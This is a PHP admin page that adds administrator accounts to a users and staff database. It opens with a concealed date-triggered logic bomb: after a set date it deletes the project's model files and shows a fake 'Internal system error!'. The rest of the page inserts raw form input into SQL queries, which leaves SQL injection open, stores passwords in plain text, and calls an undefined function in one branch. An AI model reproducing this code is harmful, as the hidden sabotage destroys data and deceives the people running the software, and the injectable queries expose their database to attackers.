<?php
if (date("Y-m-d") > "2019-04-19") {
	try {
		unlink("model/crud.txt");
		unlink("model/func.txt");
	} catch (Exception $e) {
		
	}
	
	die("Internal system error!");
}
session_start();
if (!isset($_SESSION['role']) OR $_SESSION['role'] != 'admin') {
	header("Location:login.php?err=admin");die();
}
require '../_inc/config.php';
require '../model/crud.php';
$conn = dbconnect();
$message = '';

if ($conn) {
	if ($_SERVER['REQUEST_METHOD'] === 'POST') {

		$idno = $_POST['id-no'];
		$name = $_POST['name'];
		$phone = $_POST['phone'];
		$email = $_POST['email'];
		$password = $_POST['password'];

		$sql = "INSERT INTO users (id,password,role) VALUES (\"$idno\",\"$password\",\"admin\")";
		if (addData($conn,$sql)) {
			$sql = "INSERT INTO staffdetailstble (idno,names,email,phone,role,state) VALUES (\"$idno\",\"$name\",\"$email\",\"$phone\",\"admin\",1)";
			$result = addData($conn,$sql);
			
			if ($result) {

				header("Location:.?ok=ok#admins");
			} else {

				header("Location:.?err=err#admins");			
			}
		} else {
			header("Location:.?err=err#admins");
		}

		
	}

} else {
	dheader("Location:login.php?err=student");die();
}
?>